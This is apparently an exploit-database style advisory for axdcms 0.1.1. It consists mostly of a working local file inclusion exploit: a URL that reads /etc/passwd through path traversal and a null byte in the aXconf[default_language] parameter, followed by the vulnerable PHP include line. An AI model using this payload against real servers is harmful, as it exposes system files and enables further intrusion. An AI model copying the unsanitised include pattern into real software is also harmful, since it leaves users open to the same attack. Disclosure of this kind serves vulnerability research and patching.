

#######################################################
#
#  axdcms-0.1.1 &lt;=== Local File Include Vulnerbility
#
#######################################################
# Author : n0n0x
#
# Homepage: http://priasantai.uni.cc/
#
# Download script : http://biznetnetworks.dl.sourceforge.net/project/axdcms/axdcms/0.1.1/axdcms-0.1.1.zip
#######################################################


exploit :

http://localhost/www/axdcms-0.1.1/modules/profile/user.php?aXconf[default_language]=../../../../../../../../etc/passwd%00

c0de : 

include(&quot;modules/profile/lang/&quot;.$aXconf[&#039;default_language&#039;].&quot;.php&quot;);


